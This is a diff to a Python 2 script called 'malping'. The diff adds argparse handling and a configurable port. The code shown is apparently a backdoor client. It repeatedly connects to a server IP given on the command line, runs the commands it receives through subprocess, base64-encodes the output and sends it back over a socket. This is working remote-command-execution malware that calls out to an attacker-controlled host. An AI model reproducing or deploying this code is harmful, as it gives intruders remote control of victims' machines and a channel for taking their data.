@@ -5,22 +5,29 @@ import time
 import socket
 import base64
 import datetime
+import argparse
 import subprocess
 
-if len(sys.argv) != 3:
-    print 'Usage: ./malping [mp_server ip] [delay time (s)]'
-    sys.exit(1)
-HOST = sys.argv[1]
-try:
-    DELAY = int(sys.argv[2])
-except ValueError:
-    print '[!] Error: Third parameter (delay time) must be an int.'
-    sys.exit(1)
 SIZE = 1024
-PORT = 80
+
+def get_args():
+    """ Parse arguments and return dictionary. """
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('host', metavar='IP', type=str)
+    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
+    parser.add_argument('-p', '--port')
+    return parser.parse_args()
 
 def main():
-    print '[+] Malping started with delay of {} seconds. Ctrl-c to exit.'.format(DELAY)
+    args = get_args()
+    DELAY = args.delay
+    HOST = args.host
+    PORT = int(args.port) if args.port else 80
+
+    print ('[+] Malping started with delay of {} seconds to port {}.' +
+           ' Ctrl-c to exit.').format(DELAY, PORT)
+
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,7 +41,8 @@ def main():
                 response = base64.b64encode(stdout)
                 s.send(response)
             except socket.error:
-                print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
+                print ('[!] ({}) Could not connect to server.' +
+                       ' Waiting...').format(datetime.datetime.now())
             finally:
                 time.sleep(DELAY)
         except KeyboardInterrupt:
